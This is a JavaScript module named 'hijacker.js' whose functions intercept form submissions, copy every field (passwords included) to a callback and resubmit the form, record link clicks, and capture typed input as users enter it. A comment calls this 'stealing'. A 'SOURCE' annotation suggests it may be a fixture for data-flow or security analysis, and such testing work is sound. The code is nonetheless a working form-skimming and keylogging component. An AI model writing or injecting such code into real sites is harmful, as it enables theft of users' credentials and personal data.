// hijacker.js - Form and click hijacking functions

// Hijack form submission
export function hijackForm(form, callback) {
  form.addEventListener("submit", (event) => {
    event.preventDefault();

    const formData = new FormData(form);
    const data = {};

    for (const [key, value] of formData.entries()) {
      data[key] = value;
    }

    callback(data, form);

    // Continue with original submission after stealing
    setTimeout(() => form.submit(), 100);
  }, true);
}

// Hijack link clicks
export function hijackLinks(selector, callback) {
  document.querySelectorAll(selector).forEach(link => {
    link.addEventListener("click", (event) => {
      const href = link.href;
      const text = link.textContent;

      callback({ href, text, element: link });
    }, true);
  });
}

// Monitor input changes
export function monitorInputs(selector, callback) {
  document.querySelectorAll(selector).forEach(input => {
    input.addEventListener("input", (event) => {
      if (input.value.length > 3) {  // Only capture substantial input
        callback({
          type: input.type,
          name: input.name,
          value: input.value,              // SOURCE: ELEMENT_VALUE
          timestamp: Date.now()
        });
      }
    });
  });
}
